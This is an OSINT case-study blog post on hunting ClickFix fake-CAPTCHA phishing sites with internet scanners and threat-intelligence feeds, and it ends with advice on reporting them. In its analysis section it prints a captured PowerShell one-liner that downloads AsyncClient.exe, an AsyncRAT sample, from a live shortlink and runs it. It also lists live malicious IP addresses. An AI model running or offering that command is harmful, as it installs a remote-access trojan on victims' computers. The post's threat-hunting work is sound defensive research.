---
title: ENG - OSINT Study Case | Hunting ClickFix Social Engineering Website
date: 2025-02-11
author: khuong
layout: post
categories: [Security]
tags: [investigation, osint,ttp]   
toc: true
image:
  path: /assets/img/warhammer_paper_sigma.jpg
---


## Overview

From reading a bunch of TI reports & news related to phishing & social engineering, there is somewhat new phishing technique in 2024 - 2025, which is ClickFix. I've done a blog post about Telegram Impersonate or you could
say [How to find impersonate website](https://0xdefh.github.io/posts/OSINT-TTP-How-to-find-impersonate-website/).

In that blog, I show how to track or find a impersonate website using pivoting from various thing from the legit website & and some HTML content, javascript, and UIL. In this blog, from those core concept we will applied it for
different case. 

`I hope you feel inspired by the ideas and techniques to start hunting on your own, just as I have drawn inspiration from those who came before me`

## Undertand What is ClickFix/ClearFake

Proofpoint researchers, who coined the term ClickFix for this tactic, reported that the initial access broker TA571 had been using it in phishing campaigns since March 2024. The scheme involved tricking users into copying and executing a command under the pretense of resolving an issue.

In practice, the TA would send an email or attachment that, when opened, **triggered a fake error message—often designed to resemble a familiar file type—prompting the user to follow the provided instructions**. But that was just the beginning.

A year later, ClickFix has certainly evolved. However, in my view, it has merely recycled existing techniques, experimenting with different legitimate services that were already available.

**By the end of 2024**, The term **DeceptionAds** was a thing, which (you can read it right [here](https://labs.guard.io/deceptionads-fake-captcha-driving-infostealer-infections-and-a-glimpse-to-the-dark-side-of-0c516f4dc0b6)) was a Ad-Networks As Enablers to `cloak` their intention
and use it to spread the Malware.

### Ads-Networks 

Threat Actor leverage these ads-network in order to maximize their infection, most of the others techniques also use it

This is how the ads-network suppose to work or it work in general.

![Ads-Network](/assets/img/Ad-networks.png)

From the above picture you can see that it is leverage a proxy which will deliver ads to user based on the Browser Fingerprint. I will not go into detail about these. There are a lot of resource talk about this and explain way better than I do.

But hey, **Let the Hunt Begin!!!**

## Hunting for ClickFix/ ClearFake Website 

### Specific tool used

For this type of job I'll used tool & information that related to URL, Domain, and mostly Scanner Database (because it will have all the HTML content that you can search on) these tool & and data sources are:

- [Validin](https://www.validin.com/)
- [URLScan.io](https://urlscan.io/)
- [AnyRun](https://any.run/)
- [Censys](https://censys.com/)
- [Shodan](https://www.shodan.io/)
- [ZoomEye](https://www.zoomeye.ai/)
- [Fofa](https://en.fofa.info/)

### Obtain intial lead or seed information - Collection

I’m not sure why, but when it comes to the collection phase, I always get goosebumps. It’s the stage where I consistently learn something new, take notes, and track that knowledge. It’s a thrill whether it's discovery or rediscovery and I absolutely love it.

So, let’s dive into the collection phase, where we gather information from various sources. For this, I want to highlight one of my favorite platforms: X (formerly Twitter). It’s a hub of talented individuals sharing valuable information and intelligence on social media.

#### Social Media, Webistes, Forum, ... (I used X for example)

Here are the list of X / Twitter Account that publish and sharing information & intelligence: 

- [Lontz - Threat Intelligence Researcher](https://x.com/lontze7)
- [@skocherhan - Provide information & intelligence on Phishing page](https://x.com/skocherhan)
- [Gen Threat Labs](https://x.com/GenThreatLabs)

From these X / Twitter account I advise you to follow even more accounts. Those are just some example account.

Or you can searach on Twitter on these hashtag: **#ClickFix**, **#FakeCapcha**, and **#ClearFake**, from these information you gain for these you will conduct to use to pivoting even more.

Here are some example about the information that present on these accounts

![Example X Information](/assets/img/example_x_intel.png)


> Early 2021, I'm still be able to use Twitter APIs to crawl these tweet and aggregated it into my system for everyday triage & verify -> analyze, but since Twitter decided the API shouldn't free any more. The tools I used just die out, I haven't had the time 
> to look in to it, probably 2025 will be the year I start to bring back those tool. If you curios what's tool I used today, I use [MISP](https://www.misp-project.org/) 
{: .prompt-info }

#### MISP 

I do use MISP in order to have a bunch of information that reported by others security folk or intelligence agencies, these information really help me to gain pivoting point,

These information ingested from multile data feed such as: Threat Fox, URLHaus, and other different sources -> so I don't have to use each of those API to ingest manually myself. 

#### Others

There still a lot of data sources that you can collect, others social media platform such as Tiktok, Instagram, Facebook and other forum that I haven't listed here

Or you could just take a look that the most used website and then start picking any UIL and part of it and search on various platform to check are there any infomation.


> As you can see, data collection is a meticulous process that requires significant effort. The scope and quality of the information gathered depend on the context, customer requirements, or personal objectives. While I have yet to master the art of collection, I continue to refine my skills and improve.
{: .prompt-info } 

### Start Pivoting & Investigate 

After a long Collection phase, you are ready to start investigate. The time of this Study Case is **5/03/2025** which all the data & the step that I took during this Study Case could
be alter because of the site is down, we will start with 2 separate study case

- With intial information
- Without intial information

> I don't have access to robust tool, so I will try to be resourceful as possible and leverage free tools & free source of data.
{: .prompt-info }

#### With Intial Information

You could go to these services and then obtain intial information from them such as:

* [Threat Fox](https://threatfox.abuse.ch/) -> you can search for the ClickFix tag, here is the query: [https://threatfox.abuse.ch/browse.php?search=tag%3Aclickfix](https://threatfox.abuse.ch/browse.php?search=tag%3Aclickfix)

Here are the result: 

![ClickFix Result from Threat Fox](/assets/img/ClickFix_threatfox.png)

Let's pick a random domain and start pivoting, if we ran to dead end, please choose another and start the loop again.

- Domain: **completedgustra[.]com**
- HTML Content: **CloudFlare checkbox**
- Javascript Content: 

-> Then redirect to another sudomain: **booking.completedgustra[.]com** which will only show the ClickFix if the the site detect browser fingerprinting is a Windows-based machine. 

Here is the screenshot from URLScan.io, access [here](https://urlscan.io/result/aac0099c-526c-47e4-94d9-aea6906a1a61/)

![Windows Only](/assets/img/windows_only.png)

From this, you can identify additional pivot points, like the phrase: '**This page is intended for Windows users only.**' you can use this to search for more information.

We’ll aim to analyze this website and use it as a starting point to uncover others that are similar, potentially revealing the broader campaign or cluster behind it (with any luck).

We start examinate the headers, requets, javascript and many more -> these thing make this website unique.

First, it is the request to the main website that return a HTTP response, we will search on URLScan the resource hash which is unique for this HTTP response. 

![HTTP Response](/assets/img/unique_hash.png)

By searching this hash on URLScan.io or any platform that allow you search for HTTP response content in term of hash value the it should do it

![Unique Hash Result](/assets/img/unique_hash_search_result.png)

We’ve observed a few key details here:

* Consistent naming conventions
* Identical HTTP response hashes
* The same 'booking' subdomain
* The same resource path '/win'

These domains **likely belong to the same threat actor**. We could dive deeper, but that would lead us down a rabbit hole, making this blog much longer. Still, you get the gist of it.

Also honestly you should check more information on those domains such as whois information, the date of register and so on.

But alright, let's start without the intial information.

#### Without Intial Information

Without intial information & and the limiation of resource such has robust tools, we will do this in old fashion way. Let's research some of the most used website in the Internet and the core concept of ClickFix

Which is using **copy-paste to clipboard script and make user to paste it to their CMD or Powershell command line**.

**Copy-Paste Clipboard**

From other vendors and the report that I've read these keyword usually used on the Copy-Paste notification or pop-up that request user to copy the script. So let's hunt for that indidcator or UIL.

Here are some picture related these type of pop-up, which I found on Twitter and other intelligence report from [Germán Fernández's Tweet](https://x.com/1ZRR4H/status/1897023643668062243)

![Copy-Paste Click Fix 1](/assets/img/clickfix_copy_paste1.jpeg)

And from [ܛܔܔܔܛܔܛܔܛ's Tweet](https://x.com/skocherhan/status/1889754939859009917)

![Copy-Paste Click Fix 2](/assets/img/clickfix_copy_paste2.png)

Or from [Lumma Stealer ClickFix](https://www.silentpush.com/blog/lumma-stealer/)

![Lumma Stealer ClickFix](/assets/img/clickfix_copypaste_lumma.png){: w="400" h="200" }

These Copy-Paste has
* The **embeded a javascript contain a powershell script** 
* The **Control (CTRL) + C** and **Control (CTRL) + V** 
* The **Press Windows Button** or **Windows + R** which quite a UIL in my opinion.
* The **Robot or Human** or **I'm not a robot**

Let's use Internet Scanner tools for these type of search, let's search for the HTML content 

```shell
services.http.response.body: "Windows + R" or "Verification Steps" or "CTRL + V" or "Ctrl + V" or "Windows Key" and "powershell"
```
Or you can search each of the term one by one in order to have more granular information.

> I’ve been attempting to use Google Dorks and other search engines to identify ClickFix sites indexed by them, but the process is quite time-consuming. While it’s possible to occasionally locate a ClickFix website this way, it’s not practical for scaling. I think accessing premium tools like Censys, URLScan, Fofa, or similar internet scanning platforms would significantly accelerate the process. These tools could also enable automation, allow for the creation of more precise signatures, and facilitate sharing—plus, they’d saving a lot of time.
{: .prompt-info }

We found a server that has: 
* IP Address: **66.248.206.135**
* Query: **services.http.response.body: "Windows + R"** 

By the time, I access it the site has down. 

We also found another server: 

* IP Address: **196.251.113.41**
* HTML Title / Banner: **reCAPTCHA Verification**
* Port Sequence: 80, 135, ,139, 443, 445, 3306, 5985, 47001 
* Query: **(services.http.response.body:"Verification Steps") and services.port=`443`**
* Host: `https://search.censys.io/hosts/196.251.113.41`

Example Screenshot: 

![ClickFix Check Robot](/assets/img/clickfix_check_robot.png)

![ClickFix ReCaptcha](/assets/img/clickfix_server_recaptcha.png)

![ClickFix Powershell Script](/assets/img/clickfix_server_ps_script.png)

We extracted the Powershell Script this Powershell contain few UIL such as:

* AsyncClient.exe
* URL: 2ur.jp/NJgY

Powershell Script:

```powershell
powershell -Command Invoke-WebRequest -Uri 'https://2ur.jp/NJgY' -OutFile $env:USERPROFILE\\AsyncClient.exe; Start-Process -FilePath $env:USERPROFILE\\AsyncClient.exe -Wait # ✅ ''I am not a robot - reCAPTCHA Verification ID: ${id}''`;
```

Whois information for the domain: **2ur.jp** 

![Whois Information](/assets/img/whois_2ur.png)

We found another domain: **hxxps://2ur[.]jp/NJgY** which will download a **AsycnClient.exe**, We will use URLScan.io to scan this domain you can access this link:

[https://urlscan.io/result/17cf8a96-fad0-47a3-b018-e0436b877f12/#transactions](https://urlscan.io/result/17cf8a96-fad0-47a3-b018-e0436b877f12/#transactions)

Which it will redirect to **hxxps://196.251.113[.]41/AsyncClient.exe** with the file hash 284f9498b6ee870f8a9e305738271aa015bc79e43f04eeb94adb2aadef3a0a76 and if you ever to search the hash on the VirusTotal (VT) -> ALL RED VT Link: 

[https://www.virustotal.com/gui/file/284f9498b6ee870f8a9e305738271aa015bc79e43f04eeb94adb2aadef3a0a76](https://www.virustotal.com/gui/file/284f9498b6ee870f8a9e305738271aa015bc79e43f04eeb94adb2aadef3a0a76)

![VT Information for the AsyncClient](/assets/img/VTpictures.png)

-> Which is an AsyncRAT

Well but look like I'm quite late on this discovery because on VT there are a lot of folk, vendors that has discover this and have quite extensive information on this

![VT Information](/assets/img/VTInformation_2.png)

> Why am I check so much information? To be honest this isn't all of the information I gather, as I was saying all the time, you should exhaust the artifact (the information)
{: .prompt-info }

**Captcha Page**

Fake-Captcha page also their main thing to fake and deliver their malware, as you can see from the above example 

You could search by the title **reCAPTCHA Verification** on Fofa, Censys, ... and with the combination keyword above.

**Google Related Pages**

From the above TTPs you can also applied for Google related page such as:

**Microsoft Related Pages**

Same as above, collect the information from the legit page & information on the internet, reports, and tweet.

### Take Action upon it 

From my perspective, how would I take action against it based on the context that:

- Who am I?
- What am I capable of?
- When do I want to take action/
- Where do I want to take these action?
- How long does it take for these action to come in to play?

From the above question I could do such things, that I know it's gonna work fast and give result, I do know that I could report to vendors or platfrom that incharge of these thing, if the response time is faster.


#### Post on X with the proper hashtag

I think this is the simplest action you can take, just post your finding with some picture to the Twitter and with the proper tag you could probably help a bunch of people,

#### Report it to intelligence  opensource platform 

Use can publish your finding on these plaform, and tag them as such: 

- URLHaus
- ThreatFox
- URLScan.io

-> By doing this you help the intelligence commmunity to fight against the TA. Faster detection mean less time waste on finding it and shut it down (I do know they has BulletProof Hosting and Infrastructure Laundering)

#### Publish on MISP (If you could) 

By having an account on MISP you can publish your finding on MISP.

## Conclusion & Biaes

I realize this was a long article, but I hope it offered useful insights to help you conduct independent hunts. I drew much of my inspiration from the blogs of Sekoia and Group-IB, as well as from individuals who generously share information and intelligence for free on social media and blog platforms.

My takeaway on this type of phishing is that a single moment of carelessness—like pasting something onto your computer without checking it first—can drastically increase your chances of being hacked. We live in a fast-paced world with an overwhelming amount of information circulating, and verifying everything you encounter would take an enormous amount of time.

Threat actors are well aware of this and exploit every opportunity they can. By hunting and reporting these phishing attempts, we’re making a small but meaningful contribution to slowing them down—though, to be honest, it’s impossible to completely stop every malicious or harmful act.

`I’d rather take small actions than do nothing at all, and I hope these efforts can support you on your hunting journey. By the time this blog gains recognition, those threat actors might be reading it too. I’ve read Beyond Good and Evil by Friedrich Nietzsche, and I understand that your existence is inevitable, just as there’s a moral gray area to navigate. With all due respect, good luck—we’ll do our best to slow you down as much as we can. After all, we’re inevitable too.`

### Bias

Also these thing doesn't actually work everytime, their infrastructure will change and they will use CDN such as CloudFlare & Akamai and other thing to  hide their infra from detection such as URLScan, Google Dork, generally internet scanner.

I do think that if you guy (TA) reply on CDN and those CDN servers are also on the Internet and has fixed number of servers (probably not too fixed). In my opinion, sooner or later we'll be able to scan those & corner you. 

Just my opinion, maybe I'm wrong.

## Refs

* [Sekoia - ClickFix Tactic The Phantom Meet](https://blog.sekoia.io/clickfix-tactic-the-phantom-meet/)
* [SilentPush - ClickFix](https://www.silentpush.com/blog/clickfix/)
* [Proofpoint - Clipboard Compromised Powershell Self Pwn](https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn)
* [Esentire - Lumma Stealer ClickFix Distritubtion](https://www.esentire.com/security-advisories/lumma-stealer-clickfix-distribution)
* [MalwareBytes - ClickFix vs Traditional Download in New DarkGate Campaign](https://www.malwarebytes.com/blog/news/2025/01/clickfix-vs-traditional-download-in-new-darkgate-campaign)
* [HHS - ClickFix Attacks Sector Alert TLP CLEAR](https://www.hhs.gov/sites/default/files/clickfix-attacks-sector-alert-tlpclear.pdf)
* [McAfee Labs - ClickFix Deception a Social Engineering Tactic to Deploy Malware](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clickfix-deception-a-social-engineering-tactic-to-deploy-malware/)
* [Criminal IP - ClickFix Fake Error Messags](https://blog.criminalip.io/2024/10/07/clickfix-fake-error-messages/)
* [Malicious Ads Push Lumma Information Stealer via Fake Captcha Pages](https://www.bleepingcomputer.com/news/security/malicious-ads-push-lumma-infostealer-via-fake-captcha-pages/)
* [DeceptionAds - Fake Captcha](https://labs.guard.io/deceptionads-fake-captcha-driving-infostealer-infections-and-a-glimpse-to-the-dark-side-of-0c516f4dc0b6)
* [Recorded Future - 2024 Malicious Infrastucture Report](https://www.recordedfuture.com/research/2024-malicious-infrastructure-report) (You should read the whole report)